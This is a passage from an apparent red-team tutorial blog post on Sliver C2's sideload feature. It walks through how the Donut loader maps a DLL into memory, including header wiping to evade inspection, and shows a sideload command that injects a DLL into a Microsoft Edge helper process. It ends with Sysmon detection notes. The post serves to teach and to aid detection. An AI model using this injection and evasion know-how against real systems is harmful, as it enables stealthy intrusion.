+(<a href="https://github.com/TheWover/donut/blob/master/loader/inmem_pe.c#L118">line 118</a>)
+so that we can iterate the section table.
+By the way, that one sits at the very end and looks like this:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/PE_format_section_table.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Structure of the section table of a PE file</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>I assume you get the idea.
+Stop the loader and undo the changes we made above.</p>
+<h4 id="applying-relocations">Applying relocations</h4>
+<p>Loading all data into memory is not enough to execute a PE file.
+A problem you would run into is that the code inside the file may reference addresses elsewhere within it.
+When the PE file is built these references are calculated with respect to the <code>ImageBase</code> address
+(found inside the header, <code>nt-&gt;OptionalHeader.ImageBase</code>).
+This is the address your PE file would like to be at in the memory.
+If you would write it to that exact address it would work just fine.
+If you don&rsquo;t all references are wrong though and it will crash.
+In general your PE file will never be loaded at the image base address.</p>
+<p>To fix this you have to correct all the references once you know where you wrote the data to.
+In the Donut source <code>cs</code> is the actual address in the memory
+so to fix a reference we have to add <code>cs - nt-&gt;OptionalHeader.ImageBase</code> to it.
+Sounds easy.</p>
+<p>However, to be able to do that you have to know where inside the big mess of 1&rsquo;s and 0&rsquo;s all those references are.
+This is what the base relocation table is good for
+(see also <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only">MS docs</a>).
+It stores several blocks of relocations which are basically lists of offsets to the addresses we have to adjust.
+By the way, these are called relative virtual addresses (RVA) because they are relative to the base address.
+Add the base base address to them and you get virtual addresses (VA).</p>
+<p>You can find the base relocation table by looking into the data directory of the PE file header.
+There are 16 available slots. Windows uses only 15 of them and the last one is always empty.
+Each one consists of an address (relative to the image base) and a size
+(compare <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only">docs from MS</a>).
+It looks like this:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/PE_format_data_directory.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Structure of the data directory of a PE file</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Out of this table the Donut loader can get the RVA of the relocation table
+(<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L124">line 124</a>,
+<code>rva = nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] .VirtualAddress;</code>).
+To get the actual address of it it has to add <code>cs</code> to it, the address we wrote the PE to,
+(<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L129">line 129</a>,
+<code>ibr = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);</code>).
+Knowing the table location, the loader can loop over the blocks
+(<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L132">line 132</a>)
+and over the lists inside the blocks
+(<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L135">line 135</a>)
+to correct the addresses
+(<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L137">line 137</a>).</p>
+<p>Again, lets see the theory in action to convince ourselves that there really is at least some truth to this.
+I&rsquo;ve added the following debug prints and <code>getchar();</code> statements to the code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">/* 124 */</span> rva <span style="color:#f92672">=</span> nt<span style="color:#f92672">-&gt;</span>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+<span style="color:#75715e">/* 125 */</span>     
+<span style="color:#75715e">/* 126 */</span> <span style="color:#66d9ef">if</span>(rva <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+<span style="color:#75715e">/* 127 */</span>   DPRINT(<span style="color:#e6db74">&#34;Applying Relocations&#34;</span>);
+<span style="color:#75715e">/* 128 */</span>   
+<span style="color:#75715e">/* 129 */</span>   ibr <span style="color:#f92672">=</span> RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
+<span style="color:#75715e">/* 130 */</span>   ofs <span style="color:#f92672">=</span> (PBYTE)cs <span style="color:#f92672">-</span> nt<span style="color:#f92672">-&gt;</span>OptionalHeader.ImageBase;
+<span style="color:#75715e">/* 131 */</span>   
+<span style="color:#75715e">/*  -&gt; */</span>   DPRINT(<span style="color:#e6db74">&#34;cs = %p&#34;</span>, cs);
+<span style="color:#75715e">/*  -&gt; */</span>   DPRINT(<span style="color:#e6db74">&#34;rva = %p&#34;</span>, ((ULONG_PTR)rva));
+<span style="color:#75715e">/*  -&gt; */</span>   DPRINT(<span style="color:#e6db74">&#34;imageBase = %p&#34;</span>, ((ULONG_PTR)nt<span style="color:#f92672">-&gt;</span>OptionalHeader.ImageBase));
+<span style="color:#75715e">/*  -&gt; */</span>   getchar();
+<span style="color:#75715e">/*  -&gt; */</span>   
+<span style="color:#75715e">/* 132 */</span>   <span style="color:#66d9ef">while</span>(ibr<span style="color:#f92672">-&gt;</span>VirtualAddress <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+   ...
+<span style="color:#75715e">/* 145 */</span>   }
+<span style="color:#75715e">/* 146 */</span> }
+<span style="color:#75715e">/*  -&gt; */</span> getchar();
+</code></pre></div><p>After recompiling and running the loader, execution halts right before relocations are applied
+and the following values are printed to the console:</p>
+<ul>
+<li><code>cs</code> is the base address we already saw before (<code>0x145715D0000</code>).</li>
+<li><code>rva</code> is where the loader stored the RVA of the relocation table (<code>0x27000</code>), taken from the header.</li>
+<li><code>imageBase</code> is the image base address taken from the header.</li>
+</ul>
+<p>Now lets try to find the relocation table.
+We calculate <code>cs + rva</code> and get <code>0x145715f7000</code>.
+Jump to this address in x64dbg and what you see is the first base relocation block.
+According to <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only">Microsoft documentation</a>
+it starts with the page RVA (4 bytes), followed by the block size (4 bytes),
+followed by a list of offsets (2 bytes). The first 4 bits of each offset specify its type.
+Donut only supports type <code>0xA</code> which means the offset points to a 64-bit address.
+In my example the table looked like this:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/relocation_table.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>A look at the relocation table in x64dbg</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>In the upper right you find the first base relocation block outlined in red,
+with its RVA (<code>0x1A000</code>) and block size (<code>0x30</code>) outlined inside the red box too.
+The offsets are <code>0x898</code> (type <code>0xA</code>), <code>0x8D8</code> (type <code>0xA</code>) and so on.
+These values are the ones we use to get the addresses of the locations in memory that we have to relocate.
+To each offset of the block we add the base address <code>cs</code> and our block RVA <code>0x1A000</code>.
+The values thus are <code>0x145715D0000 + 0x1A000 + 0x898 = 0x145715EA898</code>,
+<code>0x145715D0000 + 0x1A000 + 0x8D8 = 0x145715EA8D8</code> and so on.
+Lets jump in x64dbg to the first one (<code>0x145715EA898</code>) and look at it:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/addressed_to_be_relocated.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Addresses pointed to in the relocation table before applying relocations</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Above you can see both addresses we just calculated outlined in red.
+The second one is so close to the first that we can see both in the memory dump.
+So far there is nothing special to see other that that some data is stored there.</p>
+<p>Assuming that we did no mistake so far we now have to apply relocations to these addresses.
+In our debug print statements we can see the image base address, which is <code>0x180000000</code>.
+The difference between that and <code>cs</code> is <code>0x145715D0000 - 0x180000000 = 0x143F15D0000</code>,
+which is the value we have to add to the two addresses we just found to relocate them.
+Lets do that:</p>
+<ul>
+<li>at <code>0x145715ea898</code> we calculate <code>0x18001A880 + 0x143F15D0000 = 0x145715EA880</code>.</li>
+<li>at <code>0x145715ea8d8</code> we calculate <code>0x18001A890 + 0x143F15D0000 = 0x145715EA890</code>.</li>
+</ul>
+<p>Now comes the moment of truth.
+These are the two values we should expect to see after relocation.
+Give focus to the terminal running the loader and hit enter.
+The loader will apply relocations and stop again right after that.
+Watch x64dbg closely to see what happens.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/addressed_after_relocation.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Addresses pointed to in the relocation table after applying relocations</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Yep, here they are.
+The values we calculated above actually appeared on the screen.
+x64dbg also underlined them in blue which it does when values point to valid memory addresses.
+Looks like it all worked as expected.</p>
+<h4 id="processing-the-import-table">Processing the import table</h4>
+<p>Odds are the library you want to load has some dependencies.
+The job of the Donut loader is to make sure your library can find all the functions it depends on.
+Two different things must be done:</p>
+<ul>
+<li>for each DLL you depend on, load the DLL into the process memory</li>
+<li>for each function inside each DLL, store a reference to it in the import address table (IAT)</li>
+</ul>
+<p>Of course, all of the data you need is inside the PE headers.
+In there you find the &ldquo;Import Directory Table&rdquo; (IDT), which contains one entry per dependency.
+First and foremost each entry points to a <code>Name</code>, such as &ldquo;kernel32.dll&rdquo;.
+You can use the Windows API <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>
+to load a library with this name and get a handle to it.</p>
+<p>Moreover, there are pointers called <code>OriginalFirstThunk</code> in the IDT entries.
+Each one points to the &ldquo;Import Lookup Table&rdquo; (ILT) of a dependency.
+This table contains one entry per imported function, which can be identified
+either by an &ldquo;ordinal&rdquo; (think of it as the numerical ID of the function within the dependency)
+or by its &ldquo;name&rdquo;.
+Either way, you can use
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a>
+with a handle and name or ordinal as the argument to get the memory address to the function.</p>
+<p>Finally, each IDT entry contains a pointer called <code>FirstThunk</code>,
+which points to the &ldquo;Import Address Table&rdquo; (IAT).
+Initially it is exactly the same as the ILT but the loader is expected to turn
+it into a list of memory addresses, one for each imported function.
+Thus, the Donut loader must iterate over the IDT/ILTs and
+overwrite each entry in the IATs with the memory address received from
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a>.
+Since ILT and IAT are the same initially you can also iterate over the IAT while rewriting it
+and forget about the ILT completely.</p>
+<p>The implementation of that can be found
+<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L151">here</a>
+in the Donut loader.
+Just for completeness, the loader also supports delayed imports.
+Find the code <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L196">here</a>,
+right below the code for normal imports.</p>
+<p>As before, I found it educational to watch the spectacle in a debugger.
+To break at the right point in time and find good starting points in memory,
+add the following code to the loader and recompile:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">/* 148 */</span> rva <span style="color:#f92672">=</span> nt<span style="color:#f92672">-&gt;</span>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+<span style="color:#75715e">/* 149 */</span>
+<span style="color:#75715e">/* 150 */</span> <span style="color:#66d9ef">if</span>(rva <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+<span style="color:#75715e">/* 151 */</span>   DPRINT(<span style="color:#e6db74">&#34;Processing the Import Table&#34;</span>);
+<span style="color:#75715e">/* 152 */</span>  
+<span style="color:#75715e">/* 153 */</span>   imp <span style="color:#f92672">=</span> RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);
+<span style="color:#75715e">/* 154 */</span> 
+<span style="color:#75715e">/*  -&gt; */</span>   DPRINT(<span style="color:#e6db74">&#34;cs = %p&#34;</span>, cs);
+<span style="color:#75715e">/*  -&gt; */</span>   DPRINT(<span style="color:#e6db74">&#34;imp = %p&#34;</span>, ((ULONG_PTR)imp));
+<span style="color:#75715e">/*  -&gt; */</span>   getchar();
+<span style="color:#75715e">/*  -&gt; */</span>    
+<span style="color:#75715e">/* 155 */</span>   <span style="color:#75715e">// For each DLL
+</span><span style="color:#75715e"></span><span style="color:#75715e">/* 156 */</span>   <span style="color:#66d9ef">for</span> (;imp<span style="color:#f92672">-&gt;</span>Name<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>; imp<span style="color:#f92672">++</span>) {
+   ...
+<span style="color:#75715e">/* 190 */</span>   }
+<span style="color:#75715e">/*  -&gt; */</span>   getchar();
+<span style="color:#75715e">/* 191 */</span> }
+</code></pre></div><p>Execute the loader and you will see your new debug print statements.
+In my case, <code>imp</code> pointed to <code>0x28F604D2430</code>.
+Attach x64dbg and jump to this address in one of the dump windows.
+What you see is our starting point, the IDT:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/import_directory_table.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Import directory table with relevant addresses from first entry outlined in red</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>According to <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#import-directory-table">Microsoft docs</a>
+each struct in the table is 20 bytes.
+The name is found at offset 16 (outlined in red on the right),
+RVAs to the ILT and IAT are at offsets 0 and 20
+(both outlined in red on the left).
+As usual, add <code>cs</code> to the RVAs to get the addresses you want to look at:</p>
+<ul>
+<li>To see the DLL name go to: <code>0x28F604B0000 + 0x228F6 = 0x28F604D28F6</code></li>
+<li>To see the ILT go to: <code>0x28F604B0000 + 0x22508 = 0x28F604D2508</code></li>
+<li>To see the IAT go to: <code>0x28F604B0000 + 0x22060 = 0x28F604D2060</code></li>
+</ul>
+<p>You can look at the first DLL name, which is &ldquo;kernel32.dll&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/name_of_first_dll.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The name of the first DLL is kernel32.dll</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>More interesting though is the IAT for that DLL:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/IAT_before_importing.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The IAT of the first DLL before imports are processed</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>So far we can&rsquo;t see any addresses, only the initial content (same as ILT).
+But this is where they should appear once the loader is done resolving function addresses.
+Lets see if that happens.
+Press enter to resume execution until the loader gets to the 2nd <code>getchar();</code>:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/IAT_after_importing.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The IAT of the first DLL after imports are processed</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Indeed the values all changed.
+This should now be a list of 64 bit addresses pointing to the functions of <code>kernel32.dll</code>.
+For example, the first one in the screenshot is <code>0x7FFA48AA0970</code>.
+Open the memory map of x64dbg to see what memory region this points to.
+You should find the <code>.text</code> section of <code>kernel32.dll</code>:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/addresses_point_to_kernel32_dll.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The addresses point into the .text section of kernel32.dll</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Since the <code>.text</code> section is where executable code lives I was at this point
+sufficiently convinced that it all works roughly the way I think it does when it comes to imports.</p>
+<h4 id="executing-dll-entrypoint">Executing DLL entrypoint</h4>
+<p>One last thing to do before the loader can run the function we told it to run.
+Some DLLs want to perform initial setup when they are loaded.
+This is what the DLL entrypoint is good for.
+The loader&rsquo;s job is to call the entrypoint during load.</p>
+<p>The implementation in Donut is straightforward
+(see <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L260">line 260</a>).
+Get the address of the entrypoint from the header,
+then call it with the <code>DLL_PROCESS_ATTACH</code> value as argument.</p>
+<p>What will be called is the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain">DllMain</a>
+function of your DLL.
+My sample DLL used in this post does not require any initialization.
+Nevertheless, I&rsquo;ve put this function in there as boilerplate code in case I change my mind.
+That time has now come.</p>
+<p>No need for memory addresses and debugging this time.
+To see <code>DllMain</code> in action and verify it will actually be executed, you can just change the sample DLL
+in the following way. Make it print out something to the console for <code>DLL_PROCESS_ATTACH</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	<span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+	{
+	<span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+		fwprintf(stdout, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PROCESS ATTACH executed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ul_reason_for_call);
+	<span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+	<span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+	<span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+		<span style="color:#66d9ef">break</span>;
+	}
+	<span style="color:#66d9ef">return</span> TRUE;
+}
+</code></pre></div><p>Now recompile the sample DLL, create a new Donut instance from it
+(<code>.\donut.exe -p 1 -m RunMyCode C:\share\PasswordPrompt.dll</code>),
+then use it with the loader (<code>./loader.exe ./instance</code>):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/dll_entrypoint_executed.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>DLL entrypoint executed and printed the value of DLL_PROCESS_ATTACH to the console</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>The print statement wrote a message to the console.
+Indeed it works as expected.</p>
+<h4 id="calling-the-function">Calling the function</h4>
+<p>Finally we are done with all the preparation and can call a function in the DLL, like <code>RunMyCode</code>.
+Our last obstacle: finding the address of that function.
+This is what the export table of a PE file is good for.
+It contains the names and addresses of all functions in a DLL that others can dynamically link to.
+Specifically, there is a so-called &ldquo;Export Directory Table&rdquo; which has pointers to 3 lists:</p>
+<ul>
+<li>Export address table (<code>AddressOfFunctions</code>): array of RVAs to the exported functions</li>
+<li>Name pointer table (<code>AddressOfNames</code>): sorted array of pointers to function names</li>
+<li>Ordinal table (<code>AddressOfNameOrdinals</code>): array of indexes into the export address table</li>
+</ul>
+<p>Our goal is to locate the RVA of a function given its name.
+It works as follows.
+First we iterate over the name pointer table until we find a match.
+Given the index into the name pointer table, the ordinal of the function will be at the same index in the ordinal table.
+Now the ordinal is the index into the export address table, in which we can look up the RVA.
+See also the <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-edata-section-image-only">Microsoft docs</a>
+for more explanations.
+In Donut, all of this happens in between
+<a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L276">line 276</a>
+and <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L287">line 287</a>.</p>
+<p>At this point we could again add debug code to the loader to inspect the memory.
+I assume you know the drill by now and could do it easily if you wanted to.</p>
+<p>More interesting might be the following:
+Take note of <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L289">line 289</a>
+in Donut. It zeros out all the PE headers, presumably to make it less obvious that one has been loaded to memory if somebody takes a look.
+All the characteristic, easy to spot bytes such as &ldquo;This program cannot be run in DOS mode&rdquo; will be gone after loading.
+This is ok to do because all the work is done by now.
+To see that happening, add a <code>getchar();</code> right before:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">/* 289 */</span> DPRINT(<span style="color:#e6db74">&#34;Wiping Headers from memory&#34;</span>);
+<span style="color:#75715e">/*  -&gt; */</span> <span style="color:#f92672">-&gt;</span> getchar();
+<span style="color:#75715e">/* 290 */</span> Memset(cs,   <span style="color:#ae81ff">0</span>, nt<span style="color:#f92672">-&gt;</span>OptionalHeader.SizeOfHeaders);
+<span style="color:#75715e">/* 291 */</span> Memset(base, <span style="color:#ae81ff">0</span>, nt<span style="color:#f92672">-&gt;</span>OptionalHeader.SizeOfHeaders);
+</code></pre></div><p>Recompile the loader and run again.
+Execution stops right before headers are deleted.
+Attach a debugger and look at the memory the DLL was loaded at.
+By default Donut prints it out in its debug messages.
+Find it in the screenshot outlined in red (for me it was <code>0x2871A050000</code>):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/before_wiping_headers.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>PE file can be identified easily in memory before wiping headers</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Convince yourself that this is the DOS header.
+Now hit enter to resume execution.
+All the data will disappear and only zeros will be left:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/after_wiping_headers.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>After wiping headers you will only see zeros</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Then finally, at <a href="https://github.com/TheWover/donut/blob/0c1d3d09e73a25c65ca7381385a9570c4994239c/loader/inmem_pe.c#L294">line 294</a>
+and the following, the function is called if successfully resolved
+(either with or without arguments).
+We saw in the beginning of this post that it worked as advertised several times.
+Thus, I&rsquo;m done with Donut at this point.</p>
+<h2 id="detection">Detection</h2>
+<p>In <a href="../../post/learning_sliver_c2_09_execute_assembly/#detection">post 9</a> I ran Sysmon
+with a medium verbosity <a href="https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml">configuration file</a>
+(sysmon-modular) to see what telemetry you can expect when using <code>execute-assembly</code>.
+Here I did the same for <code>sideload</code>.
+If you don&rsquo;t yet have Sysmon, see <a href="../../post/learning_sliver_c2_06_stagers_process_injection/#detection">here</a> for installation instructions.</p>
+<p>Take as an example the customized command developed in the beginning,
+which launches an <code>identity_helper.exe</code> process from an implant in MS Edge:
+<code>sideload --entry-point RunMyCode --process &quot;C:\Program Files (x86)\Microsoft\Edge\Application\109.0.1518.61\identity_helper.exe&quot; /mnt/smb/PasswordPrompt.dll 3</code></p>
+<p>I cleaned the event log before running this command.
+Once it finished, I opened Windows Event Viewer and found the Sysmon events seen in the screenshot below.
+To get there, open the “Event Viewer” and select “Application and Services Logs” -&gt; “Microsoft” -&gt; “Windows” -&gt; “Sysmon” -&gt; “Operational”:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/34_sliver_c2_sideload/sysmon_and_sideload.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Sysmon events observed when using sideload</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Sysmon collected the following events I thought might be interesting:</p>
+<ul>
+<li>Event 10: process access with &ldquo;GrantedAccess&rdquo; &ldquo;0x1fffff&rdquo; from &ldquo;msgedge.exe&rdquo; to &ldquo;identity_helper.exe&rdquo;</li>
+<li>Event 8: create remote threat from &ldquo;msgedge.exe&rdquo; to &ldquo;identity_helper.exe&rdquo;</li>
+</ul>
+<p>Due to Slivers use of classic process injection we can see events 10 and 8.
+As far as I know this cannot be avoided with Sliver unless you fork the implant and change the process injection technique.</p>
+<p>With regards to the activity of Donut itself I did not spot any tell-tale events.
+Of course you may, for example, see events related to the loading of imported libraries.
+But all that is more related to the DLL you run, not to Donut running it.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2023-02-04T00:00:00&#43;00:00">
+    4 Feb, 2023
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a>, <a href="/categories/donut/">donut</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/dll/">DLL</a>, <a href="/tags/donut/">donut</a>, <a href="/tags/implant/">implant</a>, <a href="/tags/pe/">PE</a>, <a href="/tags/sideload/">sideload</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">7170</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_09_execute_assembly/">Learning Sliver C2 (09) - Execute Assembly</a>
+        <time datetime="29M">29 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_08_implant_basics/">Learning Sliver C2 (08) - Implant Basics</a>
+        <time datetime="20M">20 minutes</time>
+      
